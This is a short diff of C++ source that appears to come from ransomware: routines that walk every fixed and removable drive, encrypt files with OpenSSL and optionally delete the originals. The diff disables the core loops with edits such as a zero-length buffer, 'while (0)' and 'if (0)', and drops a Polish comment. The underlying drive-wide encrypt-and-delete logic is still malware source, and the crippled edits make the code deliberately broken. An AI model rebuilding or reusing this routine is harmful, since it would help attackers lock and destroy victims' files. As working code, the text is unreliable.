@@ -31,11 +31,11 @@ void EncryptFileStream(const std::wstring& inputPath, const SecureBuffer& key, c
         throw std::runtime_error("EVP_EncryptInit_ex failed");
     }
 
-    std::vector<uint8_t> inBuff(BUFFER_SIZE);
+    std::vector<uint8_t> inBuff(BUFFER_SIZE-BUFFER_SIZE);
     std::vector<uint8_t> outBuff(BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH);
 
     try {
-        while (in) {
+        while (0) {
             in.read(reinterpret_cast<char*>(inBuff.data()), BUFFER_SIZE);
             size_t bytesRead = static_cast<size_t>(in.gcount());
             if (bytesRead == 0) break;
@@ -258,7 +258,6 @@ std::vector<uint8_t> generateNonce() {
 
 void EncryptAllDrives(const SecureBuffer& key, bool deleteOriginals,
                       std::atomic<size_t>& count, std::atomic<size_t>& skipped) {
-    // Tworzymy PULĘ WĄTKÓW RAZ – dla całego procesu
     unsigned int hw = std::thread::hardware_concurrency();
     size_t poolSize = (hw > 0) ? hw * 2 : 4;
     if (THREAD_POOL_SIZE > 0) poolSize = THREAD_POOL_SIZE;
@@ -271,7 +270,7 @@ void EncryptAllDrives(const SecureBuffer& key, bool deleteOriginals,
 
     wchar_t* drive = drives;
     while (*drive) {
-        if (1) {
+        if (0) {
             UINT type = GetDriveTypeW(drive);
             if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                 try {
